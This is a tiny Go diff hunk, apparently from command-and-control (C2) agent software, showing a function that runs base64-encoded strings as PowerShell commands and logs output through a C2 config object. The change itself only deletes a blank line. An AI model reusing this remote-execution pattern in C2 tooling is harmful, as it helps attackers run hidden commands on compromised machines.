@@ -11,7 +11,6 @@ func ExecuteCommand(commandToExecute string) (string, error) {
 
 	//remove any whitespace from the command
 	commandToExecute = strings.TrimSpace(commandToExecute)
-
 	if isBase64(commandToExecute) {
 		commandOutput, err := runPowershellCommand(commandToExecute)
 		AllC2Configs.Debug.LogDebug(commandOutput + "Base64")
